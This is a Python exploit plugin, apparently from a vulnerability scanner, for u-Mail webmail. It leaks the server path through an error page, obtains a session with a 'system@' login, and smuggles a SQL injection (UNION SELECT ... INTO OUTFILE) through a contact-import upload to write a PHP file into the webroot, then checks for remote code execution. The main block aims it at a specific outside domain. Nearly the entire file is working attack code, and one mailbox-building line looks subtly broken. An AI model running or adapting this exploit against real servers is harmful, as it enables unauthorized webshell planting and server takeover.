#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
# ref:http://www.wooyun.org/bugs/wooyun-2010-093049


def assign(service, arg):
    if service == "umail":
        return True, arg


def getPath(arg):
    import re
    path = ''
    url = arg + 'webmail/client/mail/module/test.php'
    code, head, res, errcode, finalurl = curl.curl(url)
    path = re.findall('(?<=in <b>).+(?=</b> on)', res)
    if path != []:
        return path[0]
    else:
        return False


def PHPSESSID(arg):
    import re
    import time
    url = arg + 'webmail/fast/index.php?module=operate&action=login'
    data = 'mailbox=system@' + arg[0][:-1] + '&link=index.php'
    code, head, res, errcode, finalurl = curl.curl(" -d '" + data + "' " + url)
    PHPSESSID = re.findall('PHPSESSID=([^;]+);', head)
    if PHPSESSID != []:
        return PHPSESSID[0]
    else:
        return False

def getShell(arg, path):
    gbk = '''\xc3\xfb,\xb5\xe7\xd7\xd3\xd3\xca\xbc\xfe\xb5\xd8\xd6\xb7,\xd6\xf7\xd2\xaa\xb5\xe7\xbb\xb0,\xc9\xfa\xc8\xd5,\xd7\xa1\xd5\xac\xb5\xe7\xbb\xb0,\xc9\xcc\xce\xf1\xb5\xe7\xbb\xb0,\xd3\xc3\xbb\xa7 1,\xd3\xc3\xbb\xa7 2,\xd7\xa1\xd5\xac\xb5\xd8\xd6\xb7 \xb9\xfa\xbc\xd2/\xb5\xd8\xc7\xf8,\xd7\xa1\xd5\xac\xb5\xd8\xd6\xb7 \xca\xa1/\xca\xd0/\xd7\xd4\xd6\xce\xc7\xf8,\xd7\xa1\xd5\xac\xb5\xd8\xd6\xb7 \xca\xd0/\xcf\xd8,\xd7\xa1\xd5\xac\xb5\xd8\xd6\xb7 \xbd\xd6\xb5\xc0,\xd7\xa1\xd5\xac\xb5\xd8\xd6\xb7 \xd3\xca\xd5\xfe\xb1\xe0\xc2\xeb,\xcd\xf8\xd2\xb3,\xb5\xa5\xce\xbb,\xb2\xbf\xc3\xc5,\xd6\xb0\xce\xf1,\xc9\xcc\xce\xf1\xb5\xd8\xd6\xb7 \xbd\xd6\xb5\xc0,\xc9\xcc\xce\xf1\xb5\xd8\xd6\xb7 \xd3\xca\xd5\xfe\xb1\xe0\xc2\xeb,\xc9\xcc\xce\xf1\xb4\xab\xd5\xe6,\xb5\xe7\xd7\xd3\xd3\xca\xbc\xfe 2 \xb5\xd8\xd6\xb7,\xb5\xe7\xd7\xd3\xd3\xca\xbc\xfe 3 \xb5\xd8\xd6\xb7,\xb8\xbd\xd7\xa2\n'''
    url = arg + \
        "webmail/fast/pab/index.php?module=operate&action=contact-import"
    h = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5mO1fUKbTrBp3BFL'
    data = '''------WebKitFormBoundary5mO1fUKbTrBp3BFL
Content-Disposition: form-data; name='import_file'; filename='add.txt'
Content-Type: text/plain\r\n\r\n''' + gbk + '''fuck,hello' AND 1=2 UNION SELECT '<?php echo md5(0x22);' INTO OUTFILE '{path}'#,,0000-00-00,,,,,,,,,,,,,,,,,,,
------WebKitFormBoundary5mO1fUKbTrBp3BFL
Content-Disposition: form-data; name='import_group'

5
------WebKitFormBoundary5mO1fUKbTrBp3BFL
Content-Disposition: form-data; name='import_mode'

ignore
------WebKitFormBoundary5mO1fUKbTrBp3BFL--

'''
    path = path[:-27] + 'testtest.php'
    data = data.replace('{path}', path)
    data = data.replace('\\', '/')

    payload = '-H "{0}"  -d "{1}" {2}'.format(h, data, url)
    code, head, res, errcode, finalurl = curl.curl(payload)


def audit(arg):
    path = getPath(arg)
    SESSID = PHPSESSID(arg)
    if path and SESSID:
        getShell(arg, path)
        url = arg + 'webmail/testtest.php'
        code, head, res, errcode, finalurl = curl.curl(url)
        if res.find('e369853df766fa44e1ed0ff613f563bd') != -1:
            security_hole('u-Mail unauthentication remote shell')

if __name__ == '__main__':
    from dummy import *
    audit(assign('umail', 'http://ygs-hn.com/')[1])